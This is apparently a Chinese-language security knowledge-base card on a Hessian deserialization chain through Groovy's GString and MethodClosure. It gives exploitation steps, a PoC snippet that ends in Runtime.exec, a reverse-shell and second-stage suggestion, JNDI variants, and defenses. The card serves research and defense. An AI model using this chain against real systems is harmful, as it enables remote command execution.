---
id: web-java-deser-hessian-groovy-gstring-chain
title: Hessian Groovy GString 链：hashCode → toString → Closure.call 命令执行
type: scenario
domain: web
path: web/java/deserialization/hessian
technique: hessian-groovy-gstring-chain
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
tags:
- java
- hessian
- deserialization
- groovy
- gstring
- methodclosure
- rce
cve: []
verification:
  verified_by: verifier-V8
  verified_at: '2026-11-05T00:31:52+08:00'
  notes: 已对照原文核对 GString hashCode→toString→writeTo→Closure.call 调用栈、MethodClosure('calc','execute') 与 maximumNumberOfParameters=0、ContinuationDirContext/ConvertedClosure 变体；原文明确 JCheckBox 原生链存疑，卡片未将其作为可信链，处理正确；PoC 未在本机执行。
url: /docs/web/java/deserialization/hessian/web-java-deser-hessian-groovy-gstring-chain/
draft: false
kb_aliases:
- Hessian Groovy 链
- GString 反序列化链
- MethodClosure execute 链
- Groovy GString hashCode RCE
- ContinuationDirContext Groovy 链
---

## 一句话结论

目标 classpath 含 Groovy 时，把 `GStringImpl` 作为 HashMap 的 key 放入 Hessian 流，`HashMap.put` 调用 `GString.hashCode` → `toString` → `writeTo`，在满足 `values` 为 `Closure` 子类且 `maximumNumberOfParameters == 0` 时调用 `Closure.call`；用 `MethodClosure("calc","execute")` 即可让 `"calc".execute()` 走到 `Runtime.exec`，实现无第三方 sink 的命令执行。

## 原理

- Groovy 的 `GString` 重写了 `hashCode`，其内部会调用 `toString()` 拼接字符串；`GString.toString()` 调用 `writeTo(Writer)`。
- `GString.writeTo` 遍历 `values`：当某个 value 是 `groovy.lang.Closure` 且 `maximumNumberOfParameters == 0` 时，直接调用 `closure.call()`（无参），把返回值拼进字符串。
- `MethodClosure` 是 `Closure` 的子类，构造参数为 `(owner, method)`；其 `doCall` 通过 Groovy 元类调用 `owner` 上的 `method`。`owner` 传字符串 `"calc"`、`method` 传 `"execute"` 时，等价于执行 `"calc".execute()`——Groovy 为 `String` 扩展了 `execute()`，内部走 `ProcessGroovyMethods.execute` → `Runtime.exec`。
- 需要把 `MethodClosure.maximumNumberOfParameters` 通过反射改为 0，才能进入 `writeTo` 的无参 `call` 分支（默认值不为 0）。
- 触发点在 `HashMap.put`：`GString.hashCode` 被调用，从而无需 `equals` 或 `toString` 外部触发；Hessian 的 `MapDeserializer.readMap` 的 `map.put` 正好提供了入口。
- 由于 `writeTo` 调用的是无参 `call()`，无法直接传参；但 `MethodClosure` 的 `owner`/`method` 已足以指定要调用的对象与方法，因此可调用任意无参方法（如 `SignedObject#getObject`、`JdbcRowSetImpl#getDatabaseMetaData` 触发二次反序列化/JNDI）。

## 触发条件

- Hessian 反序列化入口可控。
- 目标 classpath 含 Groovy（`groovy-all` 2.x 等），且未过滤 `GString`、`MethodClosure`。
- 攻击者能构造 `GStringImpl`（或子类）与 `MethodClosure` 对象图。
- 目标未禁用 `Runtime.exec`（命令执行本身）或链所需的无参方法。

## 利用步骤

1. 构造 `MethodClosure("calc", "execute")`，反射把 `maximumNumberOfParameters` 设为 0。
2. 构造 `GStringImpl(values={methodClosure}, strings={"any"})`。
3. 把 GString 放入 `HashMap` 作为 key，Hessian 序列化该 Map。
4. 发送 payload；服务端 `map.put` → `GString.hashCode` → `toString` → `writeTo` → `MethodClosure.call` → `"calc".execute()`。
5. 将命令替换为反弹 Shell 或下载二阶段载荷；也可把 `owner/method` 换成 `SignedObject#getObject` 等触发二次反序列化。

## PoC

```java
MethodClosure methodClosure = new MethodClosure("calc", "execute");
ReflectTools.setFieldValue(methodClosure, "maximumNumberOfParameters", 0);

String[] strings = {"any"};
Object[] values = {methodClosure};
GStringImpl gString = new GStringImpl(values, strings);

HashMap<Object, Object> map = new HashMap<>();
map.put(gString, "any");

byte[] bytes = HessianTools.hessianSer2bytes(map, "2");
HessianTools.hessianDeser(bytes, "2");
```

调用栈（关键片段）：

```text
java.lang.Runtime.exec
  <- org.codehaus.groovy.runtime.ProcessGroovyMethods.execute
  <- groovy.lang.MetaClassImpl.invokeMethod
  <- groovy.lang.Closure.call
  <- groovy.lang.GString.writeTo
  <- groovy.lang.GString.toString
  <- groovy.lang.GString.hashCode
  <- java.util.HashMap.put
  <- com.caucho.hessian.io.MapDeserializer.readMap
```

## 变体与关联

- **原生反序列化触发**：`BadAttributeValueExpException.readObject` → `GString.toString` → `writeTo` → `Closure.call`，适用于 Hessian 入口受限但存在 Java 原生反序列化的场景。
- **GString 被禁用时**：`BadAttributeValueExpException` → `Token.toString` → `UnionToken.toString` → `ListWithDefault.get` → `ObservableList.set` → `Closure.call`。
- **需要传参**：`ContinuationDirContext` 链用 `ConvertedClosure` 包装 `MethodClosure(c1, "listBindings")`，通过 TreeMap `compareTo` 触发动态代理，最终 `ContinuationContext.listBindings` 调用 `NamingManager.getObjectInstance`，按 `Reference` 远程加载（JDK<8u121）。
- 与 JDK-only 链相比，Groovy 链不依赖 `UIDefaults`，但依赖 Groovy 库；两者可互为备选。
- `MethodClosure` 的 `owner`/`method` 可指向任意无参方法，是二次反序列化与 JNDI 的通用桥。

## 检测与防御

- Hessian 入口允许列表，拒绝 `groovy.lang.GString`、`GStringImpl`、`MethodClosure`、`ConvertedClosure`、`Closure` 等。
- 移除不必要的 Groovy 依赖；若业务使用 Groovy，限制脚本执行与 `MethodClosure` 反序列化。
- 监控 `Runtime.exec`、`ProcessGroovyMethods.execute` 与 `GString.hashCode` 驱动的异常调用栈。
- 升级 Groovy 并关注其反序列化安全公告；对反序列化入口做整体白名单，而非仅依赖类名黑名单（黑名单可被 UTF-8 overlong 等绕过）。
